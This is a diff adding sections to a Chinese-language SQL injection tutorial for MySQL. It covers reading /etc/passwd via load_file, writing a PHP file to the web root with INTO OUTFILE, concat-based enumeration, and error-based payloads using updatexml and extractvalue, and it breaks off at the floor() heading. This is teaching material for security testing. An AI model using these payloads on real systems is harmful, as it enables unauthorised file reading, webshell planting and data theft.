@@ -252,4 +252,63 @@ union select 1,load_file(0x2F6563742F706173737764),3 #
 union select 1,load_file(char(47,101,99,116,47,112,97,115,115,119,100)),3 #
 ```
 
-###### (2)
+###### (2)into outfile 写文件操作
+
+与load_file()一样，需要FILE权限，且必须为绝对路径。
+
+```mysql
+select '<?php phpinfo();?>' into outfile 'c:\\wwwroot\1.php'
+```
+
+###### (3)连接字符串
+
+MySQL查询中，如果需要一次查询多个数据，可以使用`concat()`,`concat_ws()`，我一般是将多列输出拼接成一列输出。
+
+```mysql
+concat(user(),0x2c,database(),0x2c,version())
+```
+
+常用MySQL函数：
+
+|         函数         | 说明                                                 |
+| :------------------: | ---------------------------------------------------- |
+|        length        | 字符串长度                                           |
+|      substring       | 截取字符串长度                                       |
+|        ascii         | 返回ASCII码                                          |
+|         hex          | 字符串转十六进制                                     |
+|         now          | 当前系统时间                                         |
+|        unhex         | hex反向操作                                          |
+|       floor(x)       | 取地板值，                                           |
+|         md5          | 返回md5值                                            |
+|     group_concat     | 返回来自一个组的连接结果，将几列合并成一列的数据输出 |
+|      @@datadir       | 数据库路径                                           |
+|      @@basedir       | MySQL安装路径                                        |
+| @@Version_compile_os | 操作系统                                             |
+|         user         | 用户名                                               |
+|     current_user     | 当前用户名                                           |
+|     system_user      | 系统用户名                                           |
+|       database       | 数据库名                                             |
+|       version        | 数据库版本                                           |
+
+##### 5. MySQL显错式注入
+
+**MySQL不能直接使用数据类型转换显错的方式来进行提取敏感信息。**但是又另外的方式。
+
+###### （1）通过updatexml函数
+
+```mysql
+and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
+```
+
+因为函数插入参数的时候，使用了`~`,`^`的ASCII编码，分别为`0x7e`,`0x5e`，这类特殊字符在使用这些函数的时候都是非法的，因此会产生报错信息。而在报错的是哦户，SQL的解析器会自动解析SQL语句，然后造成SQL语句的执行。
+
+###### (2)通过extractvalue函数
+
+```mysql
+and (extractvalue(1,concat(0x7e,(select user()),0x7e)));	
+```
+
+第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式。如果我们写入其他格式，就会报错。并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错。原理和`updatexml`一样。
+
+###### （3）floor函数
+
